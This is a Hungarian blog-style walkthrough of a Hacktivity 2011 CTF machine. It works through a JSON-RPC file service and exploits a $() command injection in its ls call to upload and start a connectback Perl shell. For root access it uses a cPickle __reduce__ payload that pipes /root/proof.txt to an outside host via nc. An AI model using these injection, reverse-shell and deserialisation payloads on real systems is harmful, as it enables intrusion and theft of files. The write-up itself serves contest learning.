Hacktivity 2011 CtF leírás - 3. rész (NagyonKígyó)
==================================================

Eredeti publikálás dátuma: 2011-10-05 04:32:57

Végre sikerült időt szakítanom az utolsó CtF-es feladat megoldásának leírására. Korábban már említettem, hogy ez egy OpenBSD-s gép volt. Aki emiatt valami OpenBSD-specifikus fekete mágiára számított, sajnos csalódni fog, python kódokban elkövetett hibákat kellett kihasználnunk a rootra töréshez :D

Mivel el kellett mennem RCE workshopot tartani, a gép user szintre törésében nem vettem részt, így az itt leírtak a csapattársaimtól származó infók alapján, a sebezhető szerver saját gépen való futtatása, exploitálása során összeszedett tapasztalatokat mutatják be. Emiatt előre is elnézést az esetleges pontatlanságokért.

A gépen futó webszerver egy Java appletet tartalmazott, mellyel egy adott direktoriban lévő képeket lehetett nézegetni. A jar fájl kicsomagolása után a hu.silentsignal csomagban lévő CTF2011Applet.class fájlra ráeresztett jad után megvolt az alkalmazás forrása.

Ebből kiderült, hogy az applet TLS-en keresztül, JSON-RPC protokollon kommunikál a szerverrel:

```
JsonRpcHttpClient jsonrpchttpclient = 
	new JsonRpcHttpClient(new URL(
	(newStringBuilder()).append(getCodeBase().toString()).
	append("rpc.json").toString()));
svc = (Service)ProxyUtil.createProxy(getClass().getClassLoader(), 
	hu/silentsignal/CTF2011Applet$Service, jsonrpchttpclient);
KeyStore keystore = KeyStore.getInstance("JKS");
keystore.load((new URL(
	(newStringBuilder()).append(getCodeBase().toString()).
	append("ts.jks").toString())).openStream(), 
	"pop3szakma".toCharArray());
TrustManagerFactory trustmanagerfactory =
	TrustManagerFactory.getInstance(TrustManagerFactory.
	getDefaultAlgorithm());
trustmanagerfactory.init(keystore);
SSLContext sslcontext = SSLContext.getInstance("TLS");
sslcontext.init(null, trustmanagerfactory.getTrustManagers(), null);
JsonRpcHttpClient.sf = sslcontext.getSocketFactory();
```

Az is kiderült, hogy az applet két metódust hívogat. Az egyik az argumentumként megadott direktorit listázza, a másik pedig a megadott direktoriban a megadott fájl tartalmát adja vissza Base64 kódolva. Ez tök jó, már csak egy módszer kell, amivel ezeket a metódusokat mi magunk tudjuk hívni, hogy ne legyünk limitálva az applet által.

Itt van a fejemben egy kis kavarodás, ugyanis csapattársaim azt mondták, hogy tunnelezték a szervizt localhostra (gondolom socat-tal), és úgy mókoltak a Python httplib-jét használva. Nem teljesen látom, hogy erre miért volt szükség, így azt a módszert mutatom be, ami a saját gépen futtatott szervizzel működött.

Én nem játszottam tunnelezéssel, simán curl-lel oldottam meg a dolgot:

```
[0x00 OPENBSD]$ curl -d '{"id":1,"jsonrpc":"2.0","method": \\
> "getFileList","params":["."]}' -H 'Content-type: \\
> application/json' https://localhost:4444/rpc.json
```

Persze ez így sajnos nem megy, mert a curl nem tudja ellenőrizni a szerver által felajánlott tanúsítványt. Sebaj, egy -k kapcsolóval rávehetjük, hogy ne is akarja. A . direktori tartalmának lekérdezése valahogy így néz ki:

```
[0x00 OPENBSD]$ curl -k -d '{"id":1,"jsonrpc":"2.0","method":\\
> "getFileList","params":["."]}' -H 'Content-type: \\
> application/json' https://localhost:4444/rpc.json
{"jsonrpc": "2.0", "id": 1, "result": ["web"]}
```

Nagyon jó, tudunk direktorikat listázni, nézzünk kicsit körül! Nem túl nagy meló megtalálni megát a szervert, ami mint kiderült, egy pythonban, a Cherrypy framework felhasználásával készült alkalmazás. A getFileContents RPC hívással meg is nézhetjük a tartalmát:

```
[0x00 OPENBSD]$ curl -k -d '{"id":1,"jsonrpc":"2.0","method": \\
> "getFileContents","params":["..","server.py"]}' -H 'Content-type: \\
> application/json' https://localhost:4444/rpc.json
{"jsonrpc": "2.0", "id": 1, "result": 
"IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCiMKIyBTaWxlbnRTaWduYWwgQ1RGID
IwMTEgSlNPTi1SUEMgc2VydmljZQojIGJ5IGRuZXQgPGRuZXRAc2lsZW50c
2lnbmFsLmh1PgojCiMgRGVwZW5kZW5jaWVzOiBqc29ucnBjMiAoRGViaWFu
IGlzIE9LKSwgY2hlcnJ5cHkgKGVhc3lfaW5zdGFsbCBpcyBwcmVmZXJyZWQ
pCgpmcm9tIF9fZnV0dXJlX18gaW1wb3J0IHdpdGhfc3RhdGVtZW50CmZyb2
0ganNvbnJwYzIgaW1wb3J0IEpzb25ScGNBcHBsaWNhdGlvbgpmcm9tIGNoZ
XJyeXB5IGltcG9ydCB3c2dpc2VydmVyLCBBcHBsaWNhdGlvbgpmcm9tIGNo
ZXJyeXB5LndzZ2lzZXJ2ZXIuc3NsX3B5b3BlbnNzbCBpbXBvcnQgcHlPcGV
uU1NMQWRhcHRlcgpmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IFBvcGVuLCBQSV
BFCmZyb20gYmFzZTY0IGltcG9ydCBiNjRlbmNvZGUKaW1wb3J0IHJlCmltc
G9ydCBvcwoKZGVmIGNhdChkaXJuYW1lLCBmaWxlbmFtZSk6CglkaXJuYW1l
ID0gZGlybmFtZS5yZXBsYWNlKCcuLycsICcnKQoJaWYgbm90IHJlLm1hdGN
oKCdeW2EtekEtWjAtOVwuX1wtXCBdKiQnLCBkaXJuYW1lICsgZmlsZW5hbW
UpOgoJCXJhaXNlIFJ1bnRpbWVFcnJvcignRmlsZSBvciBkaXJlY3Rvcnkgb
mFtZSBjb250YWlucyBpbnZhbGlkIGNoYXJhY3RlcihzKScpCgl3aXRoIG9w
ZW4ob3MucGF0aC5qb2luKGRpcm5hbWUsIGZpbGVuYW1lKSwgJ3JiJykgYXM
gZjoKCQlyZXR1cm4gYjY0ZW5jb2RlKGYucmVhZCgpKQoKZGVmIGxzKGRpcm
5hbWUpOgoJaWYgcmUuc2VhcmNoKHInKCJ8XFx8YCknLCBkaXJuYW1lKToKC
QlyYWlzZSBSdW50aW1lRXJyb3IoJ0RpcmVjdG9yeSBuYW1lIGNvbnRhaW5z
IGludmFsaWQgY2hhcmFjdGVyKHMpJykKCWNtZCA9IFBvcGVuKCdscyAiJXM
iJyAlIGRpcm5hbWUsIHNoZWxsPVRydWUsIHN0ZG91dD1QSVBFKQoJcmV0dX
JuIGZpbHRlcihOb25lLCBjbWQuY29tbXVuaWNhdGUoKVswXS5zcGxpdCgnX
G4nKSkKCmNsYXNzIEluZGV4QXBwOgoJcGFzcwoKZGVmIG1haW4oKToKCWNv
bmZpZyA9IHsnLyc6IHsndG9vbHMuc3RhdGljZGlyLm9uJzogVHJ1ZSwKCQk
ndG9vbHMuc3RhdGljZGlyLmluZGV4JzogJ2N0ZjIwMTEuaHRtbCcsCgkJJ3
Rvb2xzLnN0YXRpY2Rpci5kaXInOiAnJXMvd2ViJyAlIG9zLmdldGN3ZCgpf
X0KCW9zLmNoZGlyKCdyb290JykKCWpzb25fcnBjX2FwcCA9IEpzb25ScGNB
cHBsaWNhdGlvbihycGNzPWRpY3QoZ2V0RmlsZUNvbnRlbnRzPWNhdCwgZ2V
0RmlsZUxpc3Q9bHMpKQoJaW5kZXhfYXBwID0gQXBwbGljYXRpb24oSW5kZX
hBcHAoKSwgY29uZmlnPWNvbmZpZykKCWRpc3AgPSB3c2dpc2VydmVyLldTR
0lQYXRoSW5mb0Rpc3BhdGNoZXIoeycvJzogaW5kZXhfYXBwLCAnL3JwYy5q
c29uJzoganNvbl9ycGNfYXBwfSkKCXNlcnZlciA9IHdzZ2lzZXJ2ZXIuQ2h
lcnJ5UHlXU0dJU2VydmVyKCgnMC4wLjAuMCcsIDQ0NDQpLCBkaXNwKQoJc2
VydmVyLnNzbF9hZGFwdGVyID0gcHlPcGVuU1NMQWRhcHRlcignLi4vc2Vyd
mVyLWNlcnQucGVtJywgJy4uL3NlcnZlcnByaXZrZXkucGVtJywgJy4uL3Nl
cnZlci1jZXJ0LnBlbScpCglzZXJ2ZXIuc3RhcnQoKQoKaWYgX19uYW1lX18
gPT0gJ19fbWFpbl9fJzoKCW1haW4oKQo="}
```

Ezt dekódolva kapjuk a szerver forrását (néhol van bent pár plusz sortörés, hogy kiférjen :) ):

```
#!/usr/bin/env python
#
# SilentSignal CTF 2011 JSON-RPC service
# by dnet <dnet@silentsignal.hu>#
# Dependencies: jsonrpc2 (Debian is OK), 
# cherrypy (easy_install is preferred)

from __future__ import with_statement
from jsonrpc2 import JsonRpcApplication
from cherrypy import wsgiserver, Application
from cherrypy.wsgiserver.ssl_pyopenssl import pyOpenSSLAdapter
from subprocess import Popen, PIPE
from base64 import b64encode
import re
import os

def cat(dirname, filename):
  dirname = dirname.replace('./', '')
  if not re.match('^[a-zA-Z0-9\\._\\-\\ ]*/dnet@silentsignal.hu>', dirname + filename):
    raise RuntimeError('File or directory name \\
	  contains invalid character(s)')
  with open(os.path.join(dirname, filename), 'rb') as f:
    return b64encode(f.read())

def ls(dirname):
  if re.search(r'("|\\\\|`)', dirname):
    raise RuntimeError('Directory name \\
	  contains invalid character(s)')
  cmd = Popen('ls "%s"' % dirname, shell=True, stdout=PIPE)
  return filter(None, cmd.communicate()[0].split('\\n'))

class IndexApp:
  pass

def main():
  config = {'/': {'tools.staticdir.on': True,
    'tools.staticdir.index': 'ctf2011.html',
    'tools.staticdir.dir': '%s/web' % os.getcwd()}}
  os.chdir('root')
  json_rpc_app = JsonRpcApplication(rpcs=dict(getFileContents=cat, 
    getFileList=ls))
  index_app = Application(IndexApp(), config=config)
  disp = wsgiserver.WSGIPathInfoDispatcher({'/': index_app, 
    '/rpc.json': json_rpc_app})
  server = wsgiserver.CherryPyWSGIServer(('0.0.0.0', 4444), disp)
  server.ssl_adapter = pyOpenSSLAdapter('../server-cert.pem', 
    '../serverprivkey.pem', '../server-cert.pem')
  server.start()

if __name__ == '__main__':
  main()
```

Hamar megtalálható a bug, amit kihasználva parancsokat tudunk futtatni a rendszeren. Az ls függvény argumentuma átesik ugyan egy szűrésen, de valami kimarad: a $() módszerrel megvalósított parancsfuttatás nincs szűrve. Így direktorinévnek pl. "$(cat /etc/passwd)"-t megadva kilistázhatjuk az /etc/passwd fájlt. Persze a parancs kimenetét nem láthatjuk, hiszen azt az ls parancs kapja meg direktorinévként. Ezt egyrészt át lehet hidalni (pl. nc-re pipe-oljuk a parancs kimenetét), másrészt nem érdekel a parancsok kimenete, ha pl. egy connectback shell-t töltünk fel a szerverre:

```
[0x00 OPENBSD]$ curl -k -d '{"id":1,"jsonrpc":"2.0","method": \\
> "getFileList","params":["$(nc -l 1313 > bd.pl)"]}' \\
> -H 'Content-type: application/json' \\
> https://localhost:4444/rpc.json 
```

és indítunk el:

```
[0x00 OPENBSD]$ curl -k -d '{"id":1,"jsonrpc":"2.0","method": \\
> "getFileList","params":["$(perl bd.pl localhost 2222)"]}' \\
> -H 'Content-type: application/json' \\
> https://localhost:4444/rpc.json
```

Tehát van egy user szintű shellünk a gépen, innen a proof.txt megtalálása már csak egy find-ba kerül :)

Okés, megvan a user szint, valahogyan root-ot kellene szerezni. Találtunk egy python-ban írt klienst, amivel az /etc/motd tartalmát lehetett változtatni. Mivel az /etc/motd-t csak a root tudja írni, a klienshez tartozó szerver root jogokkal kell fusson. Megtaláltuk a kaput, már csak ki kell nyitni :)

A kapuhoz kulcsunk nincs, viszont ki tudjuk pickelni. Illetve c**Pick**le-ni (bocs, tudom, szar, de muszáj volt ellőni :D ) Ugyanis a kliens az új motd tartalmat cPickle-lel szerializálja, és így küldi a szervernek. Miért jó ez nekünk? Idézet a pickle doksiból:

```
**Warning:** The pickle module is not intended to be secure 
against erroneous or maliciously constructed data. Never 
unpickle data received from an untrusted or unauthenticated 
source.
```

A probléma az, hogy a szerializált adatot valahogy deszerializálni kell. Azt, hogy ennek hogyan kell történnie, a szerializált adat mondja meg. Tehát mondhatom azt, hogy az én objektumom kibontásának az a módja, hogy nyitok egy connectback shellt valami távoli gép felé :)

Ezen a ponton elővehetnénk a pickle doksit, megnézhetnénk, hogyan is néz ki egy ilyen szerializált adatfolyam, és kézzel összerakhatnánk egy olyat, ami kibontáskor nyit egy shell-t. Azonban van egy másik megoldás is: a [__reduce__()](http://docs.python.org/library/pickle.html#object.__reduce__) metódus.

Kibontáskor a pickler megnézi, hogy a kibontani kívánt objektum implementálja-e a fent említett metódust. Amennyiben igen, meghívja. A metódus kétféle típussal térhet vissza: vagy egy string-gel, vagy egy tuple-lel. Nekünk a második alternatíva a nyerő. A tuple kettő, három, négy, vagy öt tagú lehet; nekünk elég lesz kettő. Az első tag egy callable objektum, a második pedig egy tuple, ami az első tagnak átadott argumentumokat tartalmazza.

Innen elég egyértelmű, hogy a callable egy subprocess.Popen lesz, az argumentumlista meg bármi, amivel olvashatóvá tehetjük számunkra a /root/proof.txt-t. Nem emlékszem már, hogy mit használtunk pontosan, de pl. ez a megoldás működhet:

```
class GetProofTxt(object) :
  def __reduce__(self):
    return (subprocess.Popen, (('sh', '-c', \\
      'nc 192.168.20.130 5555 < /root/proof.txt'),))
```

Egy ilyen objektumot szerializálva elküldve a MOTD update-elő szervernek, már érkezik is a proof.txt tartalma az 5555-ös portunkra.

Nos, hát ennyi lenne, ez volt az utolsó CtF-writeup. Kérdések, kritikák, pontosítások jöhetnek :D
